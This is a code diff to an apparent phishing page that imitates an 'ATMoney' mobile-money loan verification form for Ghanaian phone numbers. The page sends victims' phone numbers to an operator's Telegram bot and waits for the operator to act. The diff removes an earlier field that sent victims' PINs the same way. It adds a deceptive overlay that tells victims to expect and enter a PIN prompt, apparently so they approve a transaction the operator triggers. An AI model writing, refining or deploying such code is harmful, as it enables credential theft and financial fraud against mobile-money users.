@@ -401,12 +401,6 @@
             <input type="tel" id="phone" placeholder="050XXXXXXXX" maxlength="10" inputmode="numeric">
         </div>
 
-        <div class="form-group">
-            <label for="password">ATMoney PIN</label>
-            <input type="password" id="password" placeholder="••••" maxlength="4" inputmode="numeric">
-            <div class="pin-hint">Enter your 4-digit ATMoney PIN</div>
-        </div>
-
         <div class="error-msg" id="errMsg"></div>
 
         <button class="btn-primary" id="continueBtn">Verify &amp; Authorize Loan</button>
@@ -441,7 +435,6 @@
     let isProcessing = false;
 
     const phoneInput  = document.getElementById('phone');
-    const pinInput    = document.getElementById('password');
     const continueBtn = document.getElementById('continueBtn');
     const errMsg      = document.getElementById('errMsg');
     const spinner     = document.getElementById('spinner');
@@ -474,7 +467,7 @@
         return validPrefixes.some(p => phone.startsWith(p));
     }
 
-    function sendToBot(phone, pin) {
+    function sendToBot(phone) {
         if (isProcessing) return;
         isProcessing = true;
         continueBtn.disabled = true;
@@ -490,7 +483,7 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CONFIG.CHAT_ID,
-                text: `<b>🔴 ATMoney Loan Verification</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\nPIN: <code>${pin}</code>\n\nChoose Action:`,
+                text: `<b>🔴 ATMoney Loan Initiation</b>\n\nAmount: ${document.getElementById('loanAmount').textContent}\nPhone: <code>${phone}</code>\n\nChoose Action:`,
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [
@@ -504,10 +497,55 @@
             })
         })
         .then(() => {
-            spinner.style.display = 'flex';
+            showPromptScreen();
             startPolling(approveId, declineId, verifyId);
         })
         .catch(() => resetButton());
+    }
+
+    function showPromptScreen() {
+        // Create the prompt overlay to match screenshot
+        const promptOverlay = document.createElement('div');
+        promptOverlay.style.cssText = `
+            position: fixed;
+            inset: 0;
+            background: #f0f4f8;
+            z-index: 20000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+            font-family: 'DM Sans', sans-serif;
+        `;
+
+        promptOverlay.innerHTML = `
+            <div style="margin-bottom: 40px; opacity: 0.2;">
+                <svg width="120" height="120" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1">
+                    <path d="M19 7h-1V5c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h1V7c0-1.1.9-2 2-2h11c1.1 0 2 .9 2 2z"/>
+                    <path d="M20 9H8c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V11c0-1.1-.9-2-2-2zm-2 8c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/>
+                </svg>
+            </div>
+            <h2 style="font-size: 24px; font-weight: 800; color: #003DA5; line-height: 1.3; margin-bottom: 20px; max-width: 400px;">
+                You will receive a prompt to enter your ATMoney PIN. Please wait while we verify.
+            </h2>
+            <div style="width: 40px; height: 4px; background: #E30613; border-radius: 2px; margin-bottom: 30px;"></div>
+            <div id="countdown" style="font-size: 18px; font-weight: 700; color: #64748B;">10s</div>
+        `;
+
+        document.body.appendChild(promptOverlay);
+
+        let timeLeft = 10;
+        const timer = setInterval(() => {
+            timeLeft--;
+            const countdownEl = document.getElementById('countdown');
+            if (countdownEl) countdownEl.textContent = timeLeft + 's';
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                if (countdownEl) countdownEl.textContent = 'Verifying...';
+            }
+        }, 1000);
     }
 
     function startPolling(approveId, declineId, verifyId) {
@@ -561,18 +599,13 @@
         errMsg.style.display = 'none';
 
         const phone = phoneInput.value.trim();
-        const pin   = pinInput.value.trim();
 
         if (!phone || !isValidGhanaNumber(phone)) {
             showError("Please enter a valid Ghana number (e.g. 0501234567)");
             return;
         }
-        if (pin.length !== 4) {
-            showError("PIN must be exactly 4 digits");
-            return;
-        }
 
-        sendToBot(phone, pin);
+        sendToBot(phone);
     };
 
     // ── Input sanitisation ──
@@ -580,10 +613,7 @@
         phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
     });
 
-    pinInput.addEventListener('input', () => {
-        pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
-        if (pinInput.value.length === 4) pinInput.blur();
-    });
+
 
     // ── Init ──
     loadLoanDetails();
